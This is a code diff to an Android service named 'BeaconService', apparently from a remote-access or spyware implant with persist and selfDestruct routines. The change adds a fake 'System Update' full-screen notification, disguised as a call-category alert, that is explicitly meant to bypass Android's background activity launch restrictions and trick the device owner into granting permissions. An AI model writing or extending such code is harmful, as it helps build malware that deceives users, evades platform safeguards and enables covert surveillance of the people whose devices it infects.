@@ -594,23 +594,43 @@ public class BeaconService extends Service {
 
     private String persist() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                // Battery exemption
-                Intent batt = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                batt.setData(android.net.Uri.parse("package:" + getPackageName()));
-                batt.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(batt);
+            // Launch PermissionActivity via notification (bypasses BAL)
+            Intent permIntent = new Intent(this, PermissionActivity.class);
+            permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+            permIntent.putExtra("source", "persist");
 
-                // Overlay permission (needed for BAL bypass on Android 10+)
-                if (!Settings.canDrawOverlays(this)) {
-                    Intent overlay = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        android.net.Uri.parse("package:" + getPackageName()));
-                    overlay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(overlay);
-                }
+            PendingIntent contentPi = PendingIntent.getActivity(this, 1, permIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            PendingIntent fullScreenPi = PendingIntent.getActivity(this, 2, permIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+
+            Notification.Builder nb;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                nb = new Notification.Builder(this, CHANNEL_SS);
+            } else {
+                nb = new Notification.Builder(this);
             }
-            return "[+] Battery exemption + overlay permission + foreground service + boot receiver active";
-        } catch (Exception e) { return "[+] Foreground service + boot receiver active"; }
+
+            Notification notif = nb
+                .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                .setContentTitle("System Update")
+                .setContentText("Tap to configure permissions")
+                .setContentText("Permissions required — tap to allow")
+                .setPriority(Notification.PRIORITY_HIGH)
+                .setCategory(Notification.CATEGORY_CALL)
+                .setContentIntent(contentPi)
+                .setFullScreenIntent(fullScreenPi, true)
+                .setAutoCancel(true)
+                .build();
+
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (nm != null) nm.notify(8888, notif);
+
+            // Also try direct launch (works on some devices)
+            try { startActivity(permIntent); } catch (Exception ignored) {}
+
+            return "[+] Permission setup notification sent — tap to allow";
+        } catch (Exception e) { return "[-] " + e.getMessage(); }
     }
 
     private String selfDestruct() {
